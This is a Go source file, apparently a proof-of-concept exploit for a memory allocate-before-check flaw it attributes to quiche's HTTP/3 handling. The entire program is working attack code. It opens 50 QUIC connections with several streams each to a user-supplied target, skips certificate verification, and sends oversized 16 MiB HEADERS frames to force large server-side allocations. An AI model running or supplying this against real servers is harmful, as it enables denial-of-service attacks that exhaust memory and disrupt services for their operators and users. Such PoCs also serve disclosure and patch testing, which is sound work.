package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/qpack"
	"github.com/quic-go/quic-go"
)

const (
	NumConns    = 50
	NumStreams  = 4
	ValueLength = 16 * 1024 * 1024
)

func main() {
	target := flag.String("target", "", "Target server (host:port)")
	streams := flag.Int("streams", NumStreams, "")
	flag.Parse()

	if *target == "" {
		log.Fatal("Usage: ./value-heavy-poc --target host:port")
	}

	fmt.Println("Value-Heavy PoC - quiche allocate-before-check vulnerability")
	fmt.Printf("Target: %s\n", *target)
	fmt.Printf("Server limit: ignored (quiche hardcoded limit: 16 MiB per HEADERS frame)\n\n")

	headersFrame := buildOversizedHeadersFrame()
	fmt.Printf("HEADERS frame size: %d bytes (%d MiB)\n", len(headersFrame), len(headersFrame)/(1024*1024))

	fmt.Printf("Launching %d connections x %d streams = %d total streams\n", NumConns, *streams, NumConns**streams)
	fmt.Printf("Expected server allocation: %d MiB (before rejection)\n\n", NumConns**streams*ValueLength/(1024*1024))

	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
	}
	quicConf := &quic.Config{
		MaxIdleTimeout:  30 * time.Second,
		KeepAlivePeriod: 5 * time.Second,
	}

	var wg sync.WaitGroup

	for c := 0; c < NumConns; c++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()

			conn, err := quic.DialAddr(context.Background(), *target, tlsConf, quicConf)
			if err != nil {
				log.Printf("Conn %d: failed to connect: %v", connID, err)
				return
			}
			defer conn.CloseWithError(0, "done")

			if err := initHTTP3(conn); err != nil {
				log.Printf("Conn %d: HTTP/3 init failed: %v", connID, err)
				return
			}

			var streamWg sync.WaitGroup
			for s := 0; s < *streams; s++ {
				streamWg.Add(1)
				go func(streamID int) {
					defer streamWg.Done()

					stream, err := conn.OpenStream()
					if err != nil {
						log.Printf("Conn %d Stream %d: open failed: %v", connID, streamID, err)
						return
					}

					_, err = stream.Write(headersFrame)
					if err != nil {
						log.Printf("Conn %d Stream %d: write failed: %v", connID, streamID, err)
					}

					stream.Close()
				}(s)
			}
			streamWg.Wait()
			fmt.Printf("Conn %d: %d streams completed\n", connID, *streams)
		}(c)
	}

	wg.Wait()

	totalBytes := len(headersFrame) * NumConns * *streams
	totalAlloc := ValueLength * NumConns * *streams / (1024 * 1024)
	fmt.Printf("\nDone. Sent: %d MiB, Server allocation before rejection: ~%d MiB\n",
		totalBytes/(1024*1024), totalAlloc)
}

func buildOversizedHeadersFrame() []byte {
	headers := []qpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: "localhost"},
		{Name: ":path", Value: "/"},
		{Name: "x-large", Value: strings.Repeat("x", ValueLength)},
	}

	var qpackBuf bytes.Buffer
	encoder := qpack.NewEncoder(&qpackBuf)
	for _, h := range headers {
		if err := encoder.WriteField(h); err != nil {
			log.Fatalf("QPACK encode error: %v", err)
		}
	}

	var frame []byte
	frame = appendVarint(frame, 0x01)
	frame = appendVarint(frame, uint64(qpackBuf.Len()))
	frame = append(frame, qpackBuf.Bytes()...)

	return frame
}

func initHTTP3(conn *quic.Conn) error {
	ctrl, err := conn.OpenUniStream()
	if err != nil {
		return fmt.Errorf("control stream: %w", err)
	}
	buf := appendVarint(nil, 0x00)
	buf = appendVarint(buf, 0x04)
	buf = appendVarint(buf, 0x00)
	if _, err := ctrl.Write(buf); err != nil {
		return fmt.Errorf("control stream write: %w", err)
	}

	enc, err := conn.OpenUniStream()
	if err != nil {
		return fmt.Errorf("encoder stream: %w", err)
	}
	if _, err := enc.Write(appendVarint(nil, 0x02)); err != nil {
		return fmt.Errorf("encoder stream write: %w", err)
	}

	dec, err := conn.OpenUniStream()
	if err != nil {
		return fmt.Errorf("decoder stream: %w", err)
	}
	if _, err := dec.Write(appendVarint(nil, 0x03)); err != nil {
		return fmt.Errorf("decoder stream write: %w", err)
	}

	return nil
}

func appendVarint(buf []byte, v uint64) []byte {
	if v < 64 {
		return append(buf, byte(v))
	}
	if v < 16384 {
		return append(buf, byte((v>>8)|0x40), byte(v))
	}
	if v < 1073741824 {
		return append(buf, byte((v>>24)|0x80), byte(v>>16), byte(v>>8), byte(v))
	}
	return append(buf,
		byte((v>>56)|0xc0), byte(v>>48), byte(v>>40), byte(v>>32),
		byte(v>>24), byte(v>>16), byte(v>>8), byte(v))
}
